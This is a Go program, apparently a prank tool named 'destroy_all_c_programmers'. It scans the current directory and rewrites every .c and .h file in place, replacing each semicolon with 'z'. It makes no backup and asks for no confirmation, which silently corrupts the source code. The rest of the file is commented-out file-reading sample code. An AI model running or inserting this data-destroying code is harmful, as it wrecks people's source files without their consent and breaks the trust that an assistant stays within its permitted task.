package main

import (
	"io/ioutil"
	"log"
	"os"
	"strings"

	"github.com/yoonhero/destroy_all_c_programmers/utils"
)

func main() {
	dirname := "."

	f, err := os.Open(dirname)
	if err != nil {
		log.Fatal(err)
	}
	files, err := f.Readdir(-1)
	f.Close()
	utils.HandleErr(err)

	for _, file := range files {
		selectedFile := strings.Split(file.Name(), ".")
		if selectedFile[len(selectedFile)-1] == "c" || selectedFile[len(selectedFile)-1] == "h" {

			dat, err := ioutil.ReadFile(file.Name())
			utils.HandleErr(err)
			data := string(dat)
			data = strings.Replace(data, ";", "z", -1)
			err = ioutil.WriteFile(file.Name(), []byte(data), 0644)
			utils.HandleErr(err)
		}
	}

	// f, err := os.Open("/tmp/dat")
	// utils.HandleErr(err)
	// b1 := make([]byte, 5)
	// n1, err := f.Read(b1)
	// utils.HandleErr(err)
	// fmt.Printf("%d bytes: %s\n", n1, string(b1[:n1]))
	// o2, err := f.Seek(6, 0)
	// utils.HandleErr(err)
	// b2 := make([]byte, 2)
	// n2, err := f.Read(b2)
	// utils.HandleErr(err)
	// fmt.Printf("%d bytes @ %d: ", n2, o2)
	// fmt.Printf("%v\n", string(b2[:n2]))
	// o3, err := f.Seek(6, 0)
	// utils.HandleErr(err)
	// b3 := make([]byte, 2)
	// n3, err := io.ReadAtLeast(f, b3, 2)
	// utils.HandleErr(err)
	// fmt.Printf("%d bytes @ %d: %s\n", n3, o3, string(b3))
	// _, err = f.Seek(0, 0)
	// utils.HandleErr(err)
	// r4 := bufio.NewReader(f)
	// b4, err := r4.Peek(5)
	// utils.HandleErr(err)
	// fmt.Printf("5 bytes: %s\n", string(b4))
	// f.Close()
}
